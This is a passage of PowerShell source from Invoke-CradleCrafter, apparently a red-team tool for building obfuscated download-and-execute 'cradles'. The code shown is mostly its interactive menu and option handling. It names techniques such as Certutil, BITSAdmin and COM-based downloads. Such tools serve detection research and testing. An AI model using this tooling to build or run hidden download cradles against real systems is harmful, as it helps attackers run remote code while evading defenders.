                    $Cradle = (Get-Variable "MenuLevel$UserResponse`_Invoke").Value[0][3][1]

                    # Set $CurrentMenuContext in $MenuContext variable.
                    $MenuContext = $CurrentMenuContext
    
                    # Reset all obfuscation and command state variables since we are now dealing with a new cradle context.
                    $Script:ObfuscatedCradle = ''
                    $Script:ObfuscatedCradleHistory = @()
                    $Script:CliSyntax               = @()
                    $Script:ExecutionCommands       = @()
                    $Script:TokenArray              = @()
                    $Script:TokenArrayHistory       = @()

                    # Set default Url if $Script:Url has not yet been defined.
                    $DefaultUrlUsed = $FALSE
                    If(!$Script:Url)
                    {
                        $DefaultUrlUsed = $TRUE
                        $Script:Url = 'http://bit.ly/L3g1tCrad1e'
                    }

                    # Set default Path if $Script:Path has not yet been defined and we are Context Shifting into a cradle in the Disk category.
                    $DefaultPathUsed = $FALSE
                    If(!$Script:Path -AND ($CurrentMenuContext.Split('_')[0] -eq 'Disk'))
                    {
                        $DefaultPathUsed = $TRUE
                        $Script:Path = 'Default_File_Path.ps1'
                    }

                    # Store default Token in $Script:TokenArray to return default arrangement syntax (which also will not contain any Invoke syntax).
                    # Invoke-OutCradle function will perform all necessary validation and error handling before calling Out-Cradle in Out-Cradle.ps1.
                    $Script:TokenArray += , @('Rearrange',1)
                    $CradleResultArray = Invoke-OutCradle

                    # If results were returned then set them in appropriate Script-level result variables.
                    If($CradleResultArray)
                    {
                        Write-Host "`n`nObfuscatedCommand has been set to this cradle's base syntax (w/o invocation syntax):" -ForegroundColor Cyan
                        Out-CradleContents $Script:ObfuscatedCradleWithTags -FieldToHighlight 'None'
                    }

                    If($DefaultUrlUsed -AND $DefaultPathUsed)
                    {
                        Write-Host "`nNOTE:" -NoNewline -ForegroundColor Yellow
                        Write-Host ' The blank URL field was set to the default value of' -NoNewLine
                        Write-Host ' http://bit.ly/L3g1tCrad1e' -NoNewLine -ForegroundColor Magenta
                        Write-Host '.'

                        Write-Host '      The blank PATH field was set to the default value of' -NoNewLine
                        Write-Host ' Default_File_Path.ps1' -NoNewLine -ForegroundColor Magenta
                        Write-Host '.'
                    }
                    ElseIf($DefaultUrlUsed)
                    {
                        Write-Host "`nNOTE:" -NoNewline -ForegroundColor Yellow
                        Write-Host ' The blank URL field was set to the default value of' -NoNewLine
                        Write-Host ' http://bit.ly/L3g1tCrad1e' -NoNewLine -ForegroundColor Magenta
                        Write-Host '.'
                    }
                    ElseIf($DefaultPathUsed)
                    {
                        Write-Host "`nNOTE:" -NoNewline -ForegroundColor Yellow
                        Write-Host ' The blank PATH field was set to the default value of' -NoNewLine
                        Write-Host ' Default_File_Path.ps1' -NoNewLine -ForegroundColor Magenta
                        Write-Host '.'
                    }
                    If($DefaultUrlUsed -OR $DefaultPathUsed)
                    {
                        Write-Host '      To set a new value the correct syntax is' -NoNewLine
                        Write-Host ' SET OPTIONNAME VALUE' -NoNewLine -ForegroundColor Green
                        Write-Host '.'
        
                        Write-Host '      Enter' -NoNewLine
                        Write-Host ' SHOW OPTIONS' -NoNewLine -ForegroundColor Yellow
                        Write-Host ' for more details.'
                    }
                }

                $Script:LastContextShift = $CurrentMenuContext
            }

            # We use $LastMenu to maintain one-layer state of menu changes to properly display cradle information only when initially entering each cradle menu from parent menu (as opposed to backing into the menu).
            $LastMenu = $CurrentMenuContext

            $UserResponse = Show-Menu (Get-Variable "MenuLevel$UserResponse").Value $UserResponse $Script:OptionsMenu
        }
        Else
        {
            Write-Error "The variable MenuLevel$UserResponse does not exist."
            $UserResponse = 'quit'
        }
        
        # Output ObfuscatedCradle to stdout and exit since -Command was specified and -NoExit was not specified.
        If(($UserResponse -eq 'quit') -AND $CliWasSpecified -AND !$NoExitWasSpecified)
        {
            Write-Output $Script:ObfuscatedCradle.Trim("`n")
            $UserInput = 'quit'
        }
    }
}


# Get location of this script no matter what the current directory is for the process executing this script.
$ScriptDir = [System.IO.Path]::GetDirectoryName($myInvocation.MyCommand.Definition) 


Function Show-Menu
{
<#
.SYNOPSIS

HELPER FUNCTION :: Displays current menu with obfuscation navigation and application options for Invoke-CradleCrafter.

Invoke-CradleCrafter Function: Show-Menu
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Show-Menu displays current menu with obfuscation navigation and application options for Invoke-CradleCrafter.

.PARAMETER Menu

Specifies the menu options to display, with acceptable input options parsed out of this array.

.PARAMETER MenuName

Specifies the menu header display and the breadcrumb used in the interactive prompt display.

.PARAMETER Script:OptionsMenu

Specifies the script-wide variable containing additional acceptable input in addition to each menu's specific acceptable input (e.g. EXIT, QUIT, BACK, HOME, MAIN, etc.).

.EXAMPLE

C:\PS> Show-Menu

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param(
        [Parameter(ValueFromPipeline = $true)]
        [ValidateNotNullOrEmpty()]
        [Object[]]
        $Menu,

        [String]
        $MenuName,

        [Object[]]
        $Script:OptionsMenu
    )

    # Extract all acceptable values from $Menu.
    $AcceptableInput = @()
    $SelectionContainsCommand = $FALSE
    ForEach($Line in $Menu)
    {
        # If there are 4 items in each $Line in $Menu then the fourth item is a command to exec if selected.
        If($Line.Count -eq 4)
        {
            $SelectionContainsCommand = $TRUE
        }
        $AcceptableInput += ($Line[1]).Trim(' ')
    }

    $UserInput = $NULL
    
    While($AcceptableInput -NotContains $UserInput)
    {
        # Format custom breadcrumb prompt.
        Write-Host "`n"
        $BreadCrumb = $MenuName.Trim('_')
        If($BreadCrumb.Length -gt 1)
        {
            If($MenuName -ne '')
            {
                # Handle specific case substitutions from what is ALL CAPS in interactive menu and then correct casing we want to appear in the Breadcrumb.
                $BreadCrumbOCD    =   @()
                $BreadCrumbOCD += , @('memory'           , 'Memory')
                $BreadCrumbOCD += , @('disk'             , 'Disk')
                $BreadCrumbOCD += , @('pswebstring'      , 'PsWebString')
                $BreadCrumbOCD += , @('pswebdata'        , 'PsWebData')
                $BreadCrumbOCD += , @('pswebopenread'    , 'PsWebOpenRead')
                $BreadCrumbOCD += , @('netwebstring'     , 'NetWebString')
                $BreadCrumbOCD += , @('netwebdata'       , 'NetWebData')
                $BreadCrumbOCD += , @('netwebopenread'   , 'NetWebOpenRead')
                $BreadCrumbOCD += , @('pswebrequest'     , 'PsWebRequest')
                $BreadCrumbOCD += , @('psrestmethod'     , 'PsRestMethod')
                $BreadCrumbOCD += , @('netwebrequest'    , 'NetWebRequest')
                $BreadCrumbOCD += , @('pssendkeys'       , 'PsSendKeys')
                $BreadCrumbOCD += , @('pscomword'        , 'PsComWord')
                $BreadCrumbOCD += , @('pscomexcel'       , 'PsComExcel')
                $BreadCrumbOCD += , @('pscomie'          , 'PsComIE')
                $BreadCrumbOCD += , @('pscommsxml'       , 'PsComMsXml')
                $BreadCrumbOCD += , @('psinlinecsharp'   , 'PsInlineCSharp')
                $BreadCrumbOCD += , @('pscompiledcsharp' , 'PsCompiledCSharp')
                $BreadCrumbOCD += , @('certutil'         , 'Certutil')
                $BreadCrumbOCD += , @('pswebfile'        , 'PsWebFile')
                $BreadCrumbOCD += , @('psbits'           , 'PsBits')
                $BreadCrumbOCD += , @('bitsadmin'        , 'BITSAdmin')

                $BreadCrumbArray = @()
                ForEach($Crumb in $BreadCrumb.Split('_'))
                {
                    # Perform casing substitutions for any matches in $BreadCrumbOCD array.
                    $StillLookingForSubstitution = $TRUE
                    ForEach($Substitution in $BreadCrumbOCD)
                    {
                        If($Crumb.ToLower() -eq $Substitution[0])
                        {
                            $BreadCrumbArray += $Substitution[1]
                            $StillLookingForSubstitution = $FALSE
                        }
                    }

                    # If no substitution occurred above then simply upper-case the first character and lower-case all the remaining characters.
                    If($StillLookingForSubstitution)
                    {
                        $BreadCrumbArray += $Crumb.SubString(0,1).ToUpper() + $Crumb.SubString(1).ToLower()

                        # If no substitution was found for the 3rd or later BreadCrumb element then throw a warning so we can add this substitution pair to $BreadCrumbOCD.
                        If($BreadCrumb.Split('_').Count -le 2)
                        {
                            Write-Warning "No substituion pair was found for `$Crumb=$Crumb in `$BreadCrumb=$BreadCrumb. Add this `$Crumb substitution pair to `$BreadCrumbOCD array in Invoke-CradleCrafter."
                        }
                    }
                }
                $BreadCrumb = $BreadCrumbArray -Join '\'
            }
            $BreadCrumb = '\' + $BreadCrumb
        }

        # Update $Script:LastContextShift with case-adjusted OCD version of BreadCrumb. Mainly will be used for displaying CLI when only a Context Shift has occurred.
        If(($BreadCrumb.Split('\').Count -eq 3) -AND ($Script:LastContextShift.Split('_')[1] -ceq $BreadCrumb.Split('\')[2].ToLower()))
        {
            $Script:LastContextShift = $Script:LastContextShift.Split('_')[0] + '_' + $BreadCrumb.Split('\')[2]
        }
        
        # Output menu heading.
        $FirstLine = 'Choose one of the below '
        If($BreadCrumb -ne '')
        {
            $FirstLine = $FirstLine + $BreadCrumb.Trim('\') + ' '
        }
        Write-Host "$FirstLine" -NoNewLine
        
        # Change color and verbiage if selection will execute command.
        If($SelectionContainsCommand)
        {
            Write-Host 'options' -NoNewLine -ForegroundColor Green
            Write-Host ' to' -NoNewLine
            Write-Host ' APPLY' -NoNewLine -ForegroundColor Green
            Write-Host ' to current cradle' -NoNewLine
        }
        Else
        {
            Write-Host 'options' -NoNewLine -ForegroundColor Yellow
        }
        Write-Host ":`n"

        ForEach($Line in $Menu)
        {
            $LineSpace  = $Line[0]
            $LineOption = $Line[1]
            $LineValue  = $Line[2]
            Write-Host $LineSpace -NoNewLine

            # If not empty then include breadcrumb in $LineOption output (is not colored and will not affect user input syntax).
            If(($BreadCrumb -ne '') -AND ($LineSpace.StartsWith('[')))
            {
                Write-Host ($BreadCrumb.ToUpper().Trim('\') + '\') -NoNewLine
            }
            
            # Change color if selection will execute command.
            If($SelectionContainsCommand)
            {
                Write-Host $LineOption -NoNewLine -ForegroundColor Green
            }
            Else
            {
                Write-Host $LineOption -NoNewLine -ForegroundColor Yellow
            }
            
            # Handle additional coloring for PS3.0+ components and the invocation option that does not display StdOut (Runspace invocation option).
            $PS3Warning = '(PS3.0+)'
            If($LineValue.EndsWith($PS3Warning))
            {
                $LineValue = $LineValue.Replace($PS3Warning,'')
                $WritePS3WarningAtEnd = $TRUE
            }
            $StdoutWarning = '(StdOut)'
            If($LineValue.EndsWith($StdoutWarning))
            {
                $LineValue = $LineValue.Replace($StdoutWarning,'')
                $WriteStdoutWarningAtEnd = $TRUE
            }

            # Add additional coloring to string encapsulated by <> if it exists in $LineValue.
            If($LineValue.Contains('<') -AND $LineValue.Contains('>'))
            {
                $FirstPart  = $LineValue.SubString(0,$LineValue.IndexOf('<'))
                $MiddlePart = $LineValue.SubString($FirstPart.Length+1)
                $MiddlePart = $MiddlePart.SubString(0,$MiddlePart.IndexOf('>'))
                $LastPart   = $LineValue.SubString($FirstPart.Length+$MiddlePart.Length+2)
                Write-Host "`t$FirstPart" -NoNewLine
                Write-Host $MiddlePart -NoNewLine -ForegroundColor Cyan

                # Handle if more than one term needs to be output in different color.
                If($LastPart.Contains('<') -AND $LastPart.Contains('>'))
                {
                    $LineValue  = $LastPart
                    $FirstPart  = $LineValue.SubString(0,$LineValue.IndexOf('<'))
                    $MiddlePart = $LineValue.SubString($FirstPart.Length+1)
                    $MiddlePart = $MiddlePart.SubString(0,$MiddlePart.IndexOf('>'))
                    $LastPart   = $LineValue.SubString($FirstPart.Length+$MiddlePart.Length+2)
                    Write-Host $FirstPart -NoNewLine
                    Write-Host $MiddlePart -NoNewLine -ForegroundColor Cyan
                }

                If($WritePS3WarningAtEnd)
                {
                    Write-Host $LastPart -NoNewLine
                    Write-Host $PS3Warning -ForegroundColor Red
                    $WritePS3WarningAtEnd = $FALSE
                }
                ElseIf($WriteStdoutWarningAtEnd)
                {
                    Write-Host $LastPart -NoNewLine
                    Write-Host $StdoutWarning -ForegroundColor Red
                    $WriteStdoutWarningAtEnd = $FALSE
                }
                Else
                {
                    Write-Host $LastPart
                }
            }
            Else
            {
                Write-Host "`t$LineValue"
            }
        }
        
        # Prompt for user input with custom breadcrumb prompt.
        Write-Host ''
        If($UserInput -ne '') {Write-Host ''}
        $UserInput = ''
        
        While(($UserInput -eq '') -AND ($Script:CompoundCommand.Count -eq 0))
        {
            # Output custom prompt.
            Write-Host "Invoke-CradleCrafter$BreadCrumb> " -NoNewLine -ForegroundColor Magenta

            # Get interactive user input if CliCommands input variable was not specified by user.
            If(($Script:CliCommands.Count -gt 0) -OR ($Script:CliCommands -ne $NULL))
            {
                If($Script:CliCommands.GetType().Name -eq 'String')
                {
                    $NextCliCommand = $Script:CliCommands.Trim()
                    $Script:CliCommands = @()
                }
                Else
                {
                    $NextCliCommand = ([String]$Script:CliCommands[0]).Trim()
                    $Script:CliCommands = For($i=1; $i -lt $Script:CliCommands.Count; $i++) {$Script:CliCommands[$i]}
                }

                $UserInput = $NextCliCommand
            }
            Else
            {
                # If Command was defined on command line and NoExit switch was not defined then output final ObfuscatedCradle to stdout and then quit. Otherwise continue with interactive Invoke-CradleCrafter.
                If($CliWasSpecified -AND ($Script:CliCommands.Count -lt 1) -AND ($Script:CompoundCommand.Count -lt 1) -AND ($Script:QuietWasSpecified -OR !$NoExitWasSpecified))
                {
                    If($Script:QuietWasSpecified)
                    {
                        # Remove Write-Host and Start-Sleep proxy functions so that Write-Host and Start-Sleep cmdlets will be called during the remainder of the interactive Invoke-CradleCrafter session.
                        Remove-Item -Path Function:Write-Host
                        Remove-Item -Path Function:Start-Sleep

                        $Script:QuietWasSpecified = $FALSE

                        # Automatically run 'Show Options' so the user has context of what has successfully been executed.
                        $UserInput = 'show options'
                        $BreadCrumb = 'Show Options'
                    }
                    # -NoExit wasn't specified and -Command was, so we will output the result back in the main While loop.
                    If(!$NoExitWasSpecified)
                    {
                        $UserInput = 'quit'
                    }
                }
                Else
                {
                    $UserInput = (Read-Host).Trim()
                }

                # Process interactive UserInput using CLI syntax, so comma-delimited and slash-delimited commands can be processed interactively.
                If((!$Script:CliCommands -OR ($Script:CliCommands -AND ($Script:CliCommands.Count -eq 0))) -AND !$UserInput.ToLower().StartsWith('set ') -AND $UserInput.Contains(','))
                {
                    $Script:CliCommands = $UserInput.Split(',')
                    
                    # Reset $UserInput so current While loop will be traversed once more and process UserInput command as a CliCommand.
                    $UserInput = ''
                }
            }
        }

        # Trim any leading trailing slashes so it doesn't misinterpret it as a compound command unnecessarily.
        $UserInput = $UserInput.Trim('/\')

        # Cause UserInput of base menu level directories to automatically work.
        If((($MenuLevel | ForEach-Object {$_[1].Trim()}) -Contains $UserInput.Split('/\')[0]) -AND ($MenuName -ne ''))
        {
            $UserInput = 'home/' + $UserInput.Trim()
        }

        # If current command contains \ or / and does not start with SET or OUT then we are dealing with a compound command.
        # Setting $Script:CompounCommand in below IF block.
        If(($Script:CompoundCommand.Count -eq 0) -AND !$UserInput.ToLower().StartsWith('set ') -AND !$UserInput.ToLower().StartsWith('out ') -AND ($UserInput.Contains('\') -OR $UserInput.Contains('/')))
        {
            $Script:CompoundCommand = $UserInput.Split('/\')
        }

        # If current command contains \ or / and does not start with SET then we are dealing with a compound command.
        # Parsing out next command from $Script:CompounCommand in below IF block.
        If($Script:CompoundCommand.Count -gt 0)
        {
            $UserInput = ''
            While(($UserInput -eq '') -AND ($Script:CompoundCommand.Count -gt 0))
            {
                If($Script:CompoundCommand.GetType().Name -eq 'String')
                {
                    $NextCompoundCommand = $Script:CompoundCommand.Trim()
                    $Script:CompoundCommand = @()
                }
                Else
                {
                    $NextCompoundCommand = ([String]$Script:CompoundCommand[0]).Trim()
                                        
                    $Temp = $Script:CompoundCommand
                    $Script:CompoundCommand = @()
                    For($i=1; $i -lt $Temp.Count; $i++)
                    {
                        $Script:CompoundCommand += $Temp[$i]
                    }
                }
            
                $UserInput = $NextCompoundCommand
            }
        }

        # Handle new RegEx functionality.
        # Identify if there is any regex in current UserInput by removing all alphanumeric characters.
        $TempUserInput = $UserInput.ToLower()
        @(97..122) | ForEach-Object {$TempUserInput = $TempUserInput.Replace([String]([Char]$_),'')}
        @(0..9)    | ForEach-Object {$TempUserInput = $TempUserInput.Replace($_,'')}
        $TempUserInput = $TempUserInput.Replace('\','').Replace('/','').Replace('-','').Replace('?','')
        If(($TempUserInput.Length -gt 0) -AND !($UserInput.Trim().ToLower().StartsWith('set ')) -AND !($UserInput.Trim().ToLower().StartsWith('out ')) -AND !($UserInput.Trim().ToLower().StartsWith('show ')))
        {
            # Replace any simple wildcard with .* syntax.
            $UserInput = $UserInput.Replace('.*','_____').Replace('*','.*').Replace('_____','.*')

            # Prepend UserInput with ^ and append with $ if not already there.
            If(!$UserInput.Trim().StartsWith('^') -AND !$UserInput.Trim().StartsWith('.*'))
            {
                $UserInput = '^' + $UserInput
            }
            If(!$UserInput.Trim().EndsWith('$') -AND !$UserInput.Trim().EndsWith('.*'))
            {
                $UserInput = $UserInput + '$'
            }

            # See if there are any filtered matches in the current menu.
            Try
            {
                $MenuFiltered = ($Menu | Where-Object {($_[1].Trim() -Match $UserInput) -AND ($_[1].Trim().Length -gt 0)} | ForEach-Object {$_[1].Trim()})
            }
            Catch
            {
                # Output error message if Regular Expression causes error in above filtering step.
                # E.g. Using *+ instead of *[+]
                Write-Host "`n`nERROR:" -NoNewLine -ForegroundColor Red
                Write-Host ' The current Regular Expression caused the following error:'
                write-host "       $_" -ForegroundColor Red
            }

            # If there are filtered matches in the current menu then randomly choose one for the UserInput value.
            If($MenuFiltered -ne $NULL)
            {
                # Randomly select UserInput from filtered options.
                $UserInput = (Get-Random -Input $MenuFiltered).Trim()

                # Output randomly chosen option (and filtered options selected from) if more than one option were returned from regex.
                If($MenuFiltered.Count -gt 1)
                {
                    # Change color and verbiage if acceptable options will execute an obfuscation function.
                    If($SelectionContainsCommand)
                    {
                        $ColorToOutput = 'Green'
                    }
                    Else
                    {
                        $ColorToOutput = 'Yellow'
                    }

                    Write-Host "`n`nRandomly selected " -NoNewline
                    Write-Host $UserInput -NoNewline -ForegroundColor $ColorToOutput
                    write-host " from the following filtered options: " -NoNewline

                    For($i=0; $i -lt $MenuFiltered.Count-1; $i++)
                    {
                        Write-Host $MenuFiltered[$i].Trim() -NoNewLine -ForegroundColor $ColorToOutput
                        Write-Host ', ' -NoNewLine
                    }
                    Write-Host $MenuFiltered[$MenuFiltered.Count-1].Trim() -NoNewLine -ForegroundColor $ColorToOutput
                }
            }
        }
        
        If($ExitInputOptions -Contains $UserInput.ToLower())
        {
            Return $ExitInputOptions[0]
        }
        ElseIf($MenuInputOptions -Contains $UserInput.ToLower())
        {
            # Commands like 'back' that will return user to previous interactive menu.
            If($BreadCrumb.Contains('\')) {$UserInput = $BreadCrumb.SubString(0,$BreadCrumb.LastIndexOf('\')).Replace('\','_')}
            Else {$UserInput = ''}

            Return $UserInput.ToLower()
        }
        ElseIf($HomeMenuInputOptions[0] -Contains $UserInput.ToLower())
        {
            Return $UserInput.ToLower()
        }
        ElseIf($UserInput.ToLower().StartsWith('set '))
        {
            # Extract $UserInputOptionName and $UserInputOptionValue from $UserInput SET command.
            $UserInputOptionName  = $NULL
            $UserInputOptionValue = $NULL
            $HasError = $FALSE
    
            $UserInputMinusSet = $UserInput.SubString(4).Trim()
            If($UserInputMinusSet.IndexOf(' ') -eq -1)
            {
                $HasError = $TRUE
                $UserInputOptionName  = $UserInputMinusSet.Trim()
            }
            Else
            {
                $UserInputOptionName  = $UserInputMinusSet.SubString(0,$UserInputMinusSet.IndexOf(' ')).Trim().ToLower()
                $UserInputOptionValue = $UserInputMinusSet.SubString($UserInputMinusSet.IndexOf(' ')).Trim()
            }

            # Validate that $UserInputOptionName is defined in $SettableInputOptions.
            If($SettableInputOptions -Contains $UserInputOptionName)
            {
                # Perform separate validation for $UserInputOptionValue before setting value. Set to 'emptyvalue' if no value was entered.
                If($UserInputOptionValue.Length -eq 0)
                {
                    # Handle null value for PostCradleCommand differently than the other options.
                    # This is so we can "remove" this field from our cradle if it's previously been set. This field is not required.
                    If($UserInputOptionName.ToLower() -ne 'postcradlecommand')
                    {
                        $UserInputOptionName = 'emptyvalue'
                    }
                }
                Else
                {
                    # Remove evenly paired {} '' or "" if user includes it around their PostCradleCommand input.
                    ForEach($Char in @(@('{','}'),@('"','"'),@("'","'")))
                    {
                        While(($UserInputOptionValue) -AND $UserInputOptionValue.StartsWith($Char[0]) -AND $UserInputOptionValue.EndsWith($Char[1]))
                        {
                            $UserInputOptionValue = $UserInputOptionValue.SubString(1,$UserInputOptionValue.Length-2).Trim()
                        }
                    }
                }

                Switch($UserInputOptionName.ToLower())
                {
                    'url' {
                        $Script:Url = $UserInputOptionValue

                        Write-Host "`n`nSuccessfully set Url:" -ForegroundColor Cyan
                        Write-Host $Script:Url -ForegroundColor Magenta
                    }
                    'path' {
                        $Script:Path = $UserInputOptionValue

                        Write-Host "`n`nSuccessfully set Path:" -ForegroundColor Cyan
                        Write-Host $Script:Path -ForegroundColor Magenta
                    }
                    'postcradlecommand' {
                        # See if there are errors in converting $ObfuscatedCradle string to a ScriptBlock.
                        # If error occurs then throw the error to the user.
                        # If no errors then continue. We will cast String to ScriptBlock in Invoke-OutCradle function.
                        Try
                        {
                            $Script:PostCradleCommand = $UserInputOptionValue
                            $Null = $ExecutionContext.InvokeCommand.NewScriptBlock($UserInputOptionValue)
                        }
                        Catch
                        {
                            $Script:PostCradleCommand = ''
                        }

                        # Handle null value for PostCradleCommand differently than the other options.
                        # This is so we can "remove" this field from our cradle if it's previously been set. This field is not required.
                        If(!$UserInputOptionValue)
                        {
                            $Script:PostCradleCommand = ''
                            $HasError = $FALSE
                            Write-Host "`n`nSuccessfully removed value for PostCradleCommand." -ForegroundColor Cyan

                            Write-Host "`nTo set a new value the correct syntax is" -NoNewLine
                            Write-Host ' SET OPTIONNAME VALUE' -NoNewLine -ForegroundColor Green
                            Write-Host '.'
        
                            Write-Host "Enter" -NoNewLine
                            Write-Host ' SHOW OPTIONS' -NoNewLine -ForegroundColor Yellow
                            Write-Host ' for more details.'
                        }
                        Else
                        {
                            Write-Host "`n`nSuccessfully set PostCradleCommand:" -ForegroundColor Cyan
                            Write-Host $Script:PostCradleCommand -ForegroundColor Magenta
                        }
                    }
                    'emptyvalue' {
                        # No OPTIONVALUE was entered after OPTIONNAME.
                        $HasError = $TRUE
                        Write-Host "`n`nERROR:" -NoNewLine -ForegroundColor Red
                        Write-Host ' No value was entered after ' -NoNewLine
                        Write-Host $UserInputMinusSet.Trim() -NoNewLine -ForegroundColor Cyan
                        Write-Host '.' -NoNewLine
                    }
                    default {Write-Error "An invalid OPTIONNAME ($UserInputOptionName) was passed to switch block."; Exit}
                }

                # If we already have an existing $Script:ObfuscatedCradle then updating Url, Path or PostCradleCommand will update current cradle.
                If(($Script:ObfuscatedCradle.Length -gt 0) -AND !$HasError)
                {
                    # Store default Token in $Script:TokenArray to return default arrangement syntax (which also will not contain any Invoke syntax).
                    # Invoke-OutCradle function will perform all necessary validation and error handling before calling Out-Cradle in Out-Cradle.ps1.
                    $CradleResultArray = Invoke-OutCradle

                    # If results were returned then set them in appropriate Script-level result variables.
                    If($CradleResultArray)
                    {
                        Write-Host "`nObfuscatedCradle:" -ForegroundColor Cyan
                        Out-CradleContents $Script:ObfuscatedCradleWithTags -FieldToHighlight $UserInputOptionName
                    }
                }
            }
            Else
            {
                $HasError = $TRUE
                Write-Host "`n`nERROR:" -NoNewLine -ForegroundColor Red
                Write-Host ' OPTIONNAME' -NoNewLine
                Write-Host " $UserInputOptionName" -NoNewLine -ForegroundColor Cyan
                Write-Host " is not a settable option." -NoNewLine
            }
    
            If($HasError)
            {
                Write-Host "`n       Correct syntax is" -NoNewLine
                Write-Host ' SET OPTIONNAME VALUE' -NoNewLine -ForegroundColor Green
                Write-Host '.' -NoNewLine
        
                Write-Host "`n       Enter" -NoNewLine
                Write-Host ' SHOW OPTIONS' -NoNewLine -ForegroundColor Yellow
                Write-Host ' for more details.'
            }
        }
        ElseIf($AcceptableInput -Contains $UserInput)
        {
            # User input matches $AcceptableInput extracted from the current $Menu, so decide if:
            # 1) an obfuscation function needs to be called and remain in current interactive prompt, or
            # 2) return value to enter into a new interactive prompt.

            # Format breadcrumb trail to successfully retrieve the next interactive prompt.
            $UserInput = $BreadCrumb.Trim('\').Replace('\','_') + '_' + $UserInput
            If($BreadCrumb.StartsWith('\')) {$UserInput = '_' + $UserInput}

            # If the current selection contains a command to execute then continue. Otherwise return to go to another menu.
            If($SelectionContainsCommand)
            {
                # Iterate through lines in $Menu to extract command for the current selection in $UserInput.
                ForEach($Line in $Menu)
                {
                    If($Line[1].Trim(' ') -eq $UserInput.SubString($UserInput.LastIndexOf('_')+1)) {$CommandToExec = $Line[3]; Continue}
                }

                # Extract arguments from $CommandToExec.
                $Function   = $CommandToExec[0]
                $Cradle     = $CommandToExec[1]
                $TokenName  = $CommandToExec[2]
                $TokenLevel = $CommandToExec[3]

                # Retain only the tokens from $Script:TokenArray that are NOT the same token name as $TokenName.
                # This will retain the order of the arrays in $Script:TokenArray and will only retain unique TokenName arrays for each addition.
                $TokenArrayFiltered = @()
                ForEach($Token in $Script:TokenArray)
                {
                    If($Token[0] -ne $TokenName)
                    {
                        $TokenArrayFiltered += , $Token
                    }
                }
                $Script:TokenArray = $TokenArrayFiltered

                # Store unique Token in $Script:TokenArray.
                $Script:TokenArray += , @($TokenName,$TokenLevel)

                # Invoke-OutCradle function will perform all necessary validation and error handling before calling Out-Cradle in Out-Cradle.ps1.
                $CradleResultArray = Invoke-OutCradle

                # If results were returned then set them in appropriate Script-level result variables.
                If($CradleResultArray)
                {
                    # Add function invocation syntax to $CmdToPrint to be output to user in later block.
                    $CmdToPrint = @("Out-Cradle -Url " , " -Cradle $Cradle -TokenArray @('$TokenName',$TokenLevel)")
                }

                # Save current ObfuscatedCradle to see if obfuscation was successful (i.e. no warnings prevented obfuscation from occurring).
                $ObfuscatedCradleBefore = $Script:ObfuscatedCradle

                # If results were returned then set them in appropriate Script-level result variables.
                If($CradleResultArray)
                {
                    # Add to $Script:ObfuscatedCradleHistory if a change took place for the current ObfuscatedCradle.
                    $Script:ObfuscatedCradleHistory += , $Script:ObfuscatedCradle
    
                    # Convert UserInput to CLI syntax to store in CliSyntax variable if obfuscation occurred.
                    $CliSyntaxCurrentCommand = $UserInput.Trim('_ ').Replace('_','\')
    
                    # Add CLI command syntax to $Script:CliSyntax to maintain a history of commands to arrive at current obfuscated command for CLI syntax.
                    $Script:CliSyntax += $CliSyntaxCurrentCommand

                    # Add execution syntax to $Script:ExecutionCommands to maintain a history of commands to arrive at current obfuscated command.
                    $Script:ExecutionCommands += ($CmdToPrint[0] + '$Url' + $CmdToPrint[1])

                    # Output syntax of CLI syntax and full command we executed in above Switch block.
                    Write-Host "`nExecuted:`t"
                    Write-Host "  CLI:  " -NoNewline
                    Write-Host $CliSyntaxCurrentCommand -ForegroundColor Cyan
                    Write-Host "  FULL: " -NoNewline
                    Write-Host $CmdToPrint[0] -NoNewLine -ForegroundColor Cyan
                    Write-Host "'$Script:Url'" -NoNewLine -ForegroundColor Magenta
                        
                    # Only display $Script:Path if we just applied an obfuscation option in the menu context of a Disk launcher.
                    # Path will be auto set to default value if Disk launcher context is entered and user has not yet set value for Path.
                    If($BreadCrumb.StartsWith('\Disk\'))
                    {
                        Write-Host " -Path " -NoNewLine -ForegroundColor Cyan
                        Write-Host "'$Script:Path'" -NoNewLine -ForegroundColor Magenta
                    }
                        
                    If($Script:PostCradleCommand.Length -gt 0)
                    {
                        Write-Host " -PostCradleCommand " -NoNewLine -ForegroundColor Cyan
                        Write-Host "'$Script:PostCradleCommand'" -NoNewLine -ForegroundColor Magenta
                    }
                        
                    Write-Host $CmdToPrint[1] -ForegroundColor Cyan

                    # Output obfuscation result.
                    Write-Host "`nResult:`t"
                    Out-CradleContents $Script:ObfuscatedCradleWithTags
                }
            }
            Else
            {
                Return $UserInput
            }
        }
        Else
        {
            If    ($MenuInputOptionsShowHelp[0]     -Contains $UserInput) {Show-HelpMenu}
            ElseIf($MenuInputOptionsShowOptions[0]  -Contains $UserInput) {Show-OptionsMenu}
            ElseIf($TutorialInputOptions[0]         -Contains $UserInput) {Show-Tutorial}
            ElseIf($ClearScreenInputOptions[0]      -Contains $UserInput) {Clear-Host}
            # For Version 1.0 ASCII art is not necessary.
            #ElseIf($ShowAsciiArtInputOptions[0]     -Contains $UserInput) {Show-AsciiArt -Random}
            ElseIf($ResetObfuscationInputOptions[0] -Contains $UserInput)
            {
                #If(($Script:ObfuscatedCradle -ne $NULL) -AND ($Script:ObfuscatedCradle.Length -eq 0))
                If(!$Cradle -OR (($Script:ObfuscatedCradle -ne $NULL) -AND ($Script:ObfuscatedCradle.Length -eq 0)))
                {
                    Write-Host "`n`nWARNING:" -NoNewLine -ForegroundColor Red
                    Write-Host " ObfuscatedCradle has not been set. There is nothing to reset."
                }
                ElseIf($Script:ObfuscatedCradle -eq $Script:PostCradleCommand)
                {
                    Write-Host "`n`nWARNING:" -NoNewLine -ForegroundColor Red
                    Write-Host " No obfuscation has been applied to ObfuscatedCradle. There is nothing to reset."
                }
                Else
                {
                    $Script:ObfuscatedCradle = ''
                    $Script:ObfuscatedCradleHistory = @()
                    $Script:CliSyntax               = @()
                    $Script:ExecutionCommands       = @()
                    $Script:TokenArray              = @()
                    $Script:TokenArrayHistory       = @()
                    
                    # Invoke-OutCradle function will perform all necessary validation and error handling before calling Out-Cradle in Out-Cradle.ps1.
                    $Script:TokenArray += , @('Rearrange',1)
                    $Null = Invoke-OutCradle

                    If($BreadCrumb.Split('\').Count -le 2)
                    {
                        # If user runs RESET outside of any cradle menu then we will reset $Cradle so entering ANY cradle menu will result in Context Shift event.
